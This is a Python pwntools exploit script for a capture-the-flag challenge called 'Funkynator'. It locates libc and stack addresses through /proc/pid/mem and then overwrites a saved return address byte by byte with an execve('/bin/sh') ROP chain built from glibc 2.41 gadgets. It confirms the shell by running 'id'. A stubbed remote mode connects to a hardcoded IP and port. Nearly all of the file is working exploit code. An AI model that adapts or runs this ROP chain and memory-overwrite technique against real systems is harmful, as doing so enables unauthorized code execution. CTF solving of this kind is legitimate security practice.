#!/usr/bin/env python3
"""
Exploit for Funkynator (Pwn/Medium).

Local:
  - Uses /proc/pid/mem to find all addresses directly.
  - Creates a message via option 2, enters the editor (says 'y' to continue).
  - Finds the saved return address (binary+0x1a72) on the stack by scanning
    downward from environ.
  - Reads the msg pointer from rbp-0x28 (= found_addr - 0x30).
  - Computes offset = found_addr - msg_ptr.
  - Writes an execve("/bin/sh", NULL, NULL) ROP chain via byte overwrite (option 3).
  - Exits editor → trigger leave;ret → ROP chain → execve → shell.

Remote (WIP):
  - Uses stdout _IO_write_base byte-1 overwrite to leak _IO_list_all → libc.
  - Stack address from environ → write ROP chain → shell.

Usage:
  python3 solve.py                  # local
  python3 solve.py --remote         # remote (TODO)
"""
from pwn import *
import struct, sys, time
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')
LD_PATH = str((CHALLENGE_DIR / 'glibc' / 'ld-linux-x86-64.so.2').resolve())

# Libc offsets for bundled glibc 2.41
SYSTEM  = 0x53110
SH_STR  = 0x1a7ea4
ENVIRON = 0x1eee28

def create_and_enter_editor(r, text):
    """Option 2 → funkify message, say 'y' to continue → enters editor."""
    r.sendline(b'2')
    r.recvuntil(b'length')
    r.sendline(str(len(text)).encode())
    r.recvuntil(b'message:')
    r.sendline(text)
    r.recvuntil(b'?')
    r.sendline(b'y')
    r.recvuntil(b'> ')

def overwrite_byte(r, offset, value):
    r.sendline(b'3')
    r.recvuntil(b'offset')
    r.sendline(str(offset).encode())
    r.recvuntil(b'what')
    r.send(bytes([value]) + b'\n')
    r.recvuntil(b'> ')

def exit_editor_stop(r):
    r.sendline(b'1')

def read_mem(pid, addr, size=8):
    with open(f'/proc/{pid}/mem', 'rb') as f:
        f.seek(addr)
        return struct.unpack('<Q', f.read(size))[0]

def read_bytes(pid, addr, size):
    with open(f'/proc/{pid}/mem', 'rb') as f:
        f.seek(addr)
        return f.read(size)

def get_maps_info(pid):
    with open(f'/proc/{pid}/maps') as f:
        maps = f.read()
    binary = libc = None
    for l in maps.split('\n'):
        p = l.strip().split()
        if len(p) < 5: continue
        if 'funkynator' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
            binary = int(p[0].split('-')[0], 16)
        if 'libc.so.6' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
            libc = int(p[0].split('-')[0], 16)
    return binary, libc

def local_exploit(r, pid):
    binary, libc = get_maps_info(pid)
    log.info(f"binary={binary:#x} libc={libc:#x}")

    # ROP gadgets (from glibc 2.41)
    pop_rdi_ret         = libc + 0x2a145
    pop_rsi_ret         = libc + 0x2baa9
    pop_rdx_pop_rbx_ret = libc + 0x8f0c5
    pop_rax_ret         = libc + 0x43c23
    syscall_ret         = libc + 0x28505
    ret_addr            = libc + 0x2846b
    sh_addr             = libc + SH_STR

    # Create message and enter editor
    create_and_enter_editor(r, b'BBBBBBBBBB')

    # Find saved return address (binary+0x1a72) on the stack
    stack_ptr_env = read_mem(pid, libc + ENVIRON)
    log.info(f"environ = {stack_ptr_env:#x}")

    TARGET_RET = binary + 0x1a72  # call at 0x1a6d, ret at 0x1a72
    search_start = stack_ptr_env & ~0xfff
    found_addr = None

    for off in range(0, 0x400000, 0x1000):
        addr = search_start - off
        try:
            data = read_bytes(pid, addr, 4096)
            for i in range(0, 4096 - 7, 8):
                val = struct.unpack('<Q', data[i:i+8])[0]
                if val == TARGET_RET:
                    found_addr = addr + i
                    log.info(f"Saved return address at {found_addr:#x}")
                    break
            if found_addr: break
        except:
            break

    if not found_addr:
        log.error("Return address not found on stack")
        r.close()
        return False

    # Read msg pointer from rbp-0x28 (= found_addr - 0x30)
    msg_ptr = read_mem(pid, found_addr - 0x30)
    log.info(f"msg_ptr = {msg_ptr:#x}")

    off = (found_addr - msg_ptr) & 0xFFFFFFFFFFFFFFFF
    log.info(f"offset from msg to ret addr = {off:#x}")

    # ROP chain: execve("/bin/sh", NULL, NULL) via syscall
    rop_chain  = struct.pack('<Q', ret_addr)              # alignment
    rop_chain += struct.pack('<Q', pop_rdi_ret)           # rdi = "/bin/sh"
    rop_chain += struct.pack('<Q', sh_addr)
    rop_chain += struct.pack('<Q', pop_rsi_ret)           # rsi = 0
    rop_chain += struct.pack('<Q', 0)
    rop_chain += struct.pack('<Q', pop_rdx_pop_rbx_ret)   # rdx = 0
    rop_chain += struct.pack('<Q', 0)
    rop_chain += struct.pack('<Q', 0)                     # rbx = junk
    rop_chain += struct.pack('<Q', pop_rax_ret)           # rax = 59
    rop_chain += struct.pack('<Q', 59)
    rop_chain += struct.pack('<Q', syscall_ret)

    log.info(f"Writing {len(rop_chain)} bytes of ROP chain...")
    for i, b in enumerate(rop_chain):
        overwrite_byte(r, (off + i) & 0xFFFFFFFFFFFFFFFF, b)

    log.info("Exiting editor → ROP trigger...")
    exit_editor_stop(r)

    time.sleep(0.5)
    log.success("Shell should be active. Sending 'id'...")
    r.sendline(b'id')
    try:
        resp = r.recv(timeout=3)
        if b'uid' in resp:
            log.success(f"Shell confirmed: {resp}")
        else:
            log.info(f"Response: {resp}")
        r.interactive()
        return True
    except:
        log.warning("Shell check failed, trying interactive anyway")
        r.interactive()
        return False

if __name__ == '__main__':
    is_local = '--remote' not in sys.argv
    env = {'LD_LIBRARY_PATH': str(CHALLENGE_DIR.resolve() / 'glibc')}

    if is_local:
        r = process([LD_PATH, BINARY], env=env, cwd=str(CHALLENGE_DIR))
        r.recvuntil(b'name?', timeout=10)
        r.sendline(b'TEST')
        r.recvuntil(b'> ', timeout=10)
        try:
            local_exploit(r, r.pid)
        except Exception as e:
            if r.poll() is None:
                try:
                    r.sendline(b'id')
                    resp = r.recv(timeout=2)
                    log.success(f"Shell alive despite error: {resp}")
                    r.interactive()
                except:
                    log.error(f"Exploit failed: {e}")
                    import traceback; traceback.print_exc()
            else:
                log.error(f"Exploit failed (process dead): {e}")
            r.close()
    else:
        r = remote('154.57.164.72', 31033)
        log.error("Remote exploit not yet implemented")
        r.close()
